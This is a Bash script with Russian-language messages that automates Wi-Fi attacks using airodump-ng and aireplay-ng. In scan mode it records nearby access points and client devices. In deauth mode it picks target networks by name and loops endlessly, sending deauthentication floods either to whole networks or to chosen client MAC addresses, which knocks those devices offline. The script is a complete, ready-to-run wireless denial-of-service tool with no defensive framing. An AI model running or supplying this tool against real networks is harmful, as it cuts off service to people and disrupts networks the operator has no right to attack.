#!/usr/bin/bash

if [ -z "$(iw dev | grep "Interface" | grep "mon" | awk '{print $2}')" ]; then
	echo -e "Адаптер не в monitor mode.\r" >&2
	exit 1
fi

sudo iw reg set RU

INTERFACE="wlp2s0mon"
OUTPUT_DIR="./scans"

while getopts "m:n:c:t:" opt; do
	case $opt in
		m) MODE="$OPTARG" ;;
		n) TARGET_ESSIDS="$OPTARG" ;;
		c) CLIENTS="$OPTARG" ;;
		t) SCAN_TIME="$OPTARG" ;;
		*) echo -e "Использование: $0 -m [scan|deauth] -n <ESSID_1, ESSID_2> -c <CLIENT_1, CLIENT_2> -t <SCAN_TIME>\r" >&2; sleep 5; exit 1 ;;
	esac
done

if [ "$MODE" == "scan" ]; then
	mkdir -p $OUTPUT_DIR
	sudo rm -rf $OUTPUT_DIR/*

	echo -e "Сканируем сети и клиентов...\r"
	sudo airodump-ng -b abg --output-format csv -w $OUTPUT_DIR/scan $INTERFACE > /dev/null 2>&1 &

	sleep $SCAN_TIME

	pkill airodump-ng

	if [ -f "$OUTPUT_DIR/scan-01.csv" ]; then
		mv "$OUTPUT_DIR/scan-01.csv" "$OUTPUT_DIR/scan.csv"
		printf "\n"
		awk -F, '
			NR > 1 {
				if ($0 ~ /Station MAC/) exit
				gsub(/^[ \t]+|[ \t]+$/, "", $1)
        		gsub(/^[ \t]+|[ \t]+$/, "", $9)
        		gsub(/^[ \t]+|[ \t]+$/, "", $14)
				printf "%s\t%s\t%s\n", $1, $9, $14
			}
		' "$OUTPUT_DIR/scan.csv" | column -t -s $'\t'
		printf "\n"
		awk -F, '
			BEGIN {
				found = 0
			}
			/Station MAC/ {
				found = 1
			} 
			found {
				gsub(/^[ \t]+|[ \t]+$/, "", $1)
        		gsub(/^[ \t]+|[ \t]+$/, "", $6)
        		gsub(/^[ \t]+|[ \t]+$/, "", $7)
				printf "%s\t%s\t%s\n", $1, $6, $7
			}
		' "$OUTPUT_DIR/scan.csv" | column -t -s $'\t'
		printf "\n"
		echo -e "Результаты сканирования сохранены в scans/scan.csv.\r"
	else
		echo -e "Сканирование не было завершено.\r"
	fi

elif [ "$MODE" == "deauth" ]; then
	if [ ! -s "$OUTPUT_DIR/scan.csv" ]; then
		echo -e "Запустите сканирование!\r" >&2
		sleep 5  # время для потока на вывод
		exit 1
	fi

	IFS=', ' read -r -a TARGET_ESSIDS <<< "$TARGET_ESSIDS"
	IFS=', ' read -r -a CLIENTS <<< "$CLIENTS"

	if [ ${#TARGET_ESSIDS[@]} -gt 0 ]; then
		echo -e "Сопоставляем ESSID с BSSID... \r"
	fi
	
	declare -A networks

	scan=$(mktemp)
	awk -F, '
		NR > 2 {
			if ($0 ~ /Station MAC/) exit 
			print $1 "," $4 "," $14
		}
	' $OUTPUT_DIR/scan.csv | sort -t, -k2n > "$scan"

	while IFS=',' read -r BSSID CH ESSID; do
		BSSID=$(echo "$BSSID" | xargs)
		CH=$(echo "$CH" | xargs)
		ESSID=$(echo "$ESSID" | xargs)
		if [ -n "$BSSID" ] && [ -n "$CH" ]; then
			if [ ${#TARGET_ESSIDS[@]} -gt 0 ]; then
				for TARGET_ESSID in "${TARGET_ESSIDS[@]}"; do
					if [[ "$ESSID" == "$TARGET_ESSID" ]]; then
						networks["$BSSID"]="$CH"
						echo -e "Найден ESSID: $ESSID (BSSID: $BSSID, CH: $CH).\r"
					fi
				done
			else
				networks["$BSSID"]="$CH"
			fi
		fi
	done < "$scan"

	rm "$scan"

	if [ ${#networks[@]} -eq 0 ]; then
		echo -e "Не найдено целевых сетей.\r" >&2
		sleep 5  # время для потока на вывод
		exit 1
	fi

	CH=""
	while true; do
		for BSSID in "${!networks[@]}"; do
			if [ "${networks[$BSSID]}" != "$CH" ] && [[ "${networks[$BSSID]}" =~ ^[0-9]+$ ]] && [ "${networks[$BSSID]}" -gt 0 ]; then
				CH="${networks[$BSSID]}"
				sudo iw dev $INTERFACE set channel $CH
			fi
			if [ $? -eq 0 ]; then
				declare -a AIREPLAY_PIDS=()
            			if [ ${#CLIENTS[@]} -eq 0 ]; then
        					echo -e "Широковещательная атака на BSSID: $BSSID...\r"
         					sudo aireplay-ng -0 10 -a $BSSID $INTERFACE > /dev/null 2>&1 &
                			AIREPLAY_PIDS+=($!)
            			else
                			for CLIENT in "${CLIENTS[@]}"; do
                    			echo -e "Атака на клиента $CLIENT в сети BSSID: $BSSID...\r"
                    			sudo aireplay-ng -0 10 -a $BSSID -c $CLIENT $INTERFACE > /dev/null 2>&1 &
                    			AIREPLAY_PIDS+=($!)  
                			done
            			fi
						sleep 1
           			for PID in "${AIREPLAY_PIDS[@]}"; do
                			if kill -0 $PID 2>/dev/null; then
                    				kill $PID
                			fi
            			done
			else
				echo -e "Адаптер не переключился на канал $CH.\r"
			fi
		done
		sleep 1
	done
fi